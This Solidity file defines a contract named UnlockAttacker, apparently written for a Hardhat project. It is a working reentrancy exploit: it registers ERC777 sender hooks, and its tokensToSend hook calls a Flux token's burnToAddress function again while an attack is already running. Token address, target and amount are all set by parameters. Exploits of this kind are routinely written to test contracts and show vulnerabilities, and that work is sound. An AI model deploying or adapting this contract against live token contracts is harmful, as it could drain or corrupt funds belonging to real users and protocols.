// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";

import "@openzeppelin/contracts/introspection/IERC1820Registry.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Sender.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777.sol";

interface IFluxToken {
    function burnToAddress(address targetAddress, uint256 amount) external;
}

contract UnlockAttacker is IERC777Sender, IERC777Recipient {
    event TokensToSendHookExecuted(string message);

    IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 constant private TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

    IFluxToken private _fluxToken;
    address private _targetAddress;
    uint256 private _attackAmount;

    enum AttackState { Idle, Attacking }
    AttackState public attackState;

    constructor() public {
        _erc1820.setInterfaceImplementer(address(this), TOKENS_SENDER_INTERFACE_HASH, address(this));
        _erc1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
        attackState = AttackState.Idle;
    }

    function setAttackParameters(address fluxTokenAddress, address targetAddress, uint256 attackAmount) public {
        _fluxToken = IFluxToken(fluxTokenAddress);
        _targetAddress = targetAddress;
        _attackAmount = attackAmount;
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        if (attackState == AttackState.Attacking) {
            // Re-enter the burnToAddress function
            _fluxToken.burnToAddress(_targetAddress, _attackAmount);
        }
        emit TokensToSendHookExecuted("UnlockAttacker tokensToSend hook executed");
    }

    function executeAttack() public {
        attackState = AttackState.Attacking;
        _fluxToken.burnToAddress(_targetAddress, _attackAmount);
        attackState = AttackState.Idle;
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata,
        bytes calldata
    ) external override {
        // Not used in this attack
    }

    receive() external payable {}
}
